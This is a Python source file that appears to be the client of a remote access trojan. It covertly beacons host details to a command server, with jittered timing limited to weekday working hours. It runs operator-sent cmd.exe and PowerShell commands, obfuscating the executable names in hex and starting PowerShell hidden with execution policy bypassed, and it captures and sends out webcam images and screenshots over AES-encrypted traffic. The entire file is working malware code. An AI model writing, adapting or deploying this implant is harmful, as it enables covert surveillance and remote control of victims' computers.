import signal
import socket
import cv2
import random
from platform import system, machine, version
from hashlib import sha256
from os import remove, path, makedirs, _exit
from time import time, sleep
from json import dumps
from base64 import b64decode, b64encode
from datetime import datetime, timezone
from subprocess import Popen, PIPE
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Hash import SHA512
from PIL import ImageGrab
from threading import Thread, Event

# Globals
client = None
log_stream = None
start_time = int(time() * 1000)
exit_process = False
beacon_interval_instance = None
beacon_stop_event = Event()
beacon_thread = None
SESSION_ID = None
LOGGING = True
CVER = "0.2.0"
TYPE = "py"
CHUNK_SIZE = 1024
SERVER_ADDRESS = 'localhost'
SERVER_PORT = 54678
MAX_RETRIES = 5
RETRY_INTERVALS = [
    10000,   # 10 seconds
    30000,   # 30 seconds
    1 * 60 * 1000,   # 1 minute
    2 * 60 * 1000,   # 2 minutes
    4 * 60 * 1000,   # 4 minutes
    6 * 60 * 1000    # 6 minutes
]
BEACON_MIN_INTERVAL = 5 * 60 * 1000  # 5 minutes
BEACON_MAX_INTERVAL = 45 * 60 * 1000  # 45 minutes

# Configure logging
if LOGGING:
    log_dir = 'logs'
    # Check if the logs directory exists, if not, create it
    if not path.exists(log_dir):
        makedirs(log_dir)
    log_stream = open(path.join(log_dir, 'client.log'), 'a')

def log_it(message):
    if LOGGING and log_stream:
        timestamp = datetime.now(timezone.utc).isoformat()
        log_stream.write(f"[{timestamp}] {message}\n")
        log_stream.flush()  # Ensure the log is written immediately

def get_session_id():
    global SESSION_ID
    try:
        ip_address = client.getpeername()[0]
        if ip_address == '::1':
            ip_address = '127.0.0.1'
        log_it(f"IP Address: {ip_address}")
        sum_ip = sum(int(val) for val in ip_address.split('.'))
        hash_object = sha256(f"{ip_address}<>{sum_ip}".encode())
        crypt = hash_object.hexdigest()[:32]
        SESSION_ID = crypt
        log_it(f"Session ID: {SESSION_ID}")
    except Exception as err:
        log_it(f"Error getting session ID: {err}")

def encrypt_data(data, shared_key):
    salt = get_random_bytes(32)
    key = PBKDF2(shared_key.encode(), salt, dkLen=32, count=200000, hmac_hash_module=SHA512)
    iv = get_random_bytes(12)
    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
    encrypted_data = cipher.encrypt(data.encode('utf-8'))
    auth_tag = cipher.digest()
    return f"{b64encode(salt).decode()}:{b64encode(iv).decode()}:{b64encode(auth_tag).decode()}:{b64encode(encrypted_data).decode()}"

def decrypt_data(encrypted, shared_key):
    parts = encrypted.split(':')
    salt = b64decode(parts[0])
    iv = b64decode(parts[1])
    auth_tag = b64decode(parts[2])
    encrypted_data = b64decode(parts[3])
    key = PBKDF2(shared_key.encode(), salt, dkLen=32, count=200000, hmac_hash_module=SHA512)
    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
    decrypted_data = cipher.decrypt_and_verify(encrypted_data, auth_tag)
    return decrypted_data.decode('utf-8')

def get_retry_interval(retries):
    return RETRY_INTERVALS[retries] if retries < len(RETRY_INTERVALS) else 0

def send_command(response):
    if SESSION_ID == None:
        raise  Exception(f"Session ID is not set.")
    encrypted = encrypt_data(dumps(response), SESSION_ID)
    if len(encrypted) >= CHUNK_SIZE:
        while len(encrypted) > 0:
            chunk = encrypted[:CHUNK_SIZE]
            encrypted = encrypted[CHUNK_SIZE:]
            if len(encrypted) == 0:
                chunk += '--FIN--'
            log_it(f"Sent Chunk: {chunk}")
            client.send(chunk.encode())
    else:
        log_it(f"Sent Data: {encrypted}")
        client.send(encrypted.encode())

def send_beacon():
    send_command({'response': {
        'beacon': True,
        'version': CVER,
        'type': TYPE,
        'platform': system(),
        'arch': machine(),
        'osver': version(),
        'hostname': socket.gethostname()
    }})

def format_file_name(name, extension):
    now = datetime.now()
    return f"{name}_{now.strftime('%Y-%m-%d_%H-%M-%S')}.{extension.strip('.')}"

def run_webcam_clip():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if not ret:
            raise Exception("Failed to capture image from webcam")
        file_name = format_file_name('wc', 'jpg')
        cv2.imwrite(file_name, frame)
        cap.release()
        with open(file_name, 'rb') as f:
            data = f.read()
        send_command({'response': {'download': file_name, 'data': b64encode(data).decode()}})
        remove(file_name)
    except Exception as err:
        send_command({'response': {'error': f"Failed to capture webcam: {str(err)}"}})

def run_screenshot():
    try:
        img = ImageGrab.grab()
        file_name = format_file_name('ss', 'jpg')
        img.save(file_name, 'JPEG')
        with open(file_name, 'rb') as f:
            data = f.read()
        send_command({'response': {'download': file_name, 'data': b64encode(data).decode()}})
        remove(file_name)
    except Exception as err:
        send_command({'response': {'error': f"Failed to capture screenshot: {str(err)}"}})

def run_command(command, payload, is_file=False):
    try:
        command = command.strip()
        if not command:
            raise Exception('No command provided.')
        if command not in ['cmd', 'ps']:
            raise Exception('Unsupported command.')
        
        args = []
        if command == "cmd":
            if ';' in payload or '&' in payload:
                raise Exception('Invalid characters in payload.')
            args = ['/c', payload]
            command = '\x63\x6d\x64\x2e\x65\x78\x65'
        elif command == "ps":
            args = [
                '-NonInteractive',
                '-NoLogo',
                '-NoProfile',
                '-WindowStyle', 'hidden',
                '-ExecutionPolicy', 'Bypass'
            ]
            if is_file:
                args.extend(['-File', payload])
            else:
                encoded_cmd = b64encode(payload.encode('utf-16le')).decode()
                args.extend(['-EncodedCommand', encoded_cmd])
            command = '\x70\x6f\x77\x65\x72\x73\x68\x65\x6c\x6c\x2e\x65\x78\x65'
        
        process = Popen([command] + args, stdout=PIPE, stderr=PIPE, shell=True)
        output, error = process.communicate(timeout=30)
        if process.returncode != 0:
            raise Exception(f"Command failed with code {process.returncode}. Error output: {error.decode()}")
        return output.decode().strip()
    except Exception as err:
        raise Exception(f"Failed to execute command: {str(err)}")

def format_time(milliseconds):
    total_seconds = int(milliseconds / 1000)
    days = total_seconds // 86400
    hours = (total_seconds % 86400) // 3600
    minutes = (total_seconds % 3600) // 60
    seconds = total_seconds % 60
    return f"{days}d {hours}h {minutes}m {seconds}s"

def get_uptime():
    current_time = int(time() * 1000)
    uptime_millis = current_time - start_time
    uptime = format_time(uptime_millis)
    send_command({'response': {'data': uptime}})

def parse_action(action):
    global client, exit_process, beacon_interval_instance
    try:
        parts = action.strip().split(' ', 1)
        command = parts[0]
        payload = parts[1] if len(parts) > 1 else None
        log_it(f"Command: {command} - Payload: {payload}")

        if command == 'ps' or command == 'cmd':
            payload = b64decode(payload).decode()
        elif command == 'up':
            get_uptime()
            return
        elif command == 'di':
            exit_process = True
            if client:
                client.close()
            if beacon_interval_instance:
                beacon_interval_instance.cancel()
            _exit(0)
        elif command == 'ss':
            run_screenshot()
            return
        elif command == 'wc':
            run_webcam_clip()
            return
        
        result = run_command(command, payload)
        send_command({'response': {'data': result}})
    except Exception as err:
        send_command({'response': {'error': f"Error: {str(err)}"}})

# Connect to server function
def connect_to_server():
    global client, beacon_thread, beacon_stop_event, exit_process, beacon_interval_instance

    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        client.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        client.connect((SERVER_ADDRESS, SERVER_PORT))
        log_it(f"Client {CVER} connected.")
        get_session_id()
        send_beacon()
        
        def beacon():
            beacon_interval = random.randint(BEACON_MIN_INTERVAL, BEACON_MAX_INTERVAL)
            while not beacon_stop_event.is_set():
                now = datetime.now()
                day = now.weekday()
                hour = now.hour
                # Check if the current day is Monday through Friday (0-4) and the hour is between 7 AM and 7 PM (inclusive)
                if 0 <= day <= 4 and 7 <= hour <= 19:
                    send_beacon()
                sleep(beacon_interval)
        
        beacon_thread = Thread(target=beacon)
        beacon_thread.start()
        
        while not exit_process:
            data = client.recv(1024)
            if not data:
                break
            log_it(f"Received Data: {data.decode('utf-8')}")
            action = decrypt_data(data.decode('utf-8'), SESSION_ID)
            if action:
                parse_action(action)
        
        log_it('Connection to server closing.')
        beacon_stop_event.set()
        if beacon_thread:
            beacon_thread.join()
        
        if not exit_process:
            connection_retries = 0
            while connection_retries <= MAX_RETRIES:
                retry_interval = get_retry_interval(connection_retries) / 1000
                log_it(f"Attempting to reconnect in {retry_interval} seconds...")
                connection_retries += 1
                sleep(retry_interval)
                client.close()
                connect_to_server()
            else:
                log_it('Max retries reached. Exiting.')
                sleep(BEACON_MAX_INTERVAL * 8)

    except Exception as err:
        log_it(f"Exception: {err}")
        beacon_stop_event.set()
        if beacon_thread:
            beacon_thread.join()
        if client:
            client.close()
        log_it(f"Error: Client connection failed. {err}")

def signal_handler(sig, frame):
    global client, beacon_interval_instance
    if client:
        client.close()
    if beacon_interval_instance:
        beacon_interval_instance.cancel()
    _exit(0)

def main():
    signal.signal(signal.SIGINT, signal_handler)
    connect_to_server()
    

if __name__ == "__main__":
    main()